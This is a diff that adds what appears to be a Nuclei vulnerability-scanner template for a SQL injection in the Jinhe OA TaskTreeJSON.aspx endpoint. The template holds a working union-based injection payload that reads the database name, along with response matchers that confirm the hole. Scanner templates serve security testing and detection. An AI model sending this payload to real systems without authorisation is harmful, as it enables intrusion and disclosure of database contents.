@@ -1,0 +1,26 @@
+id: jinheOA-TaskTreeJSON_aspx-sql
+
+info:
+  name: jinheOA-TaskTreeJSON_aspx-sql
+  author: xxx
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        GET /C6/JHSoft.Web.DailyTaskManage/TaskTreeJSON.aspx/?id=1%27+union+all+select+null%2C%28select+db_name()%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--+ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '||C6'
+          - 'permissions'
+          - 'value'
+        condition: and
+      - type: status
+        status: 
+          - 200
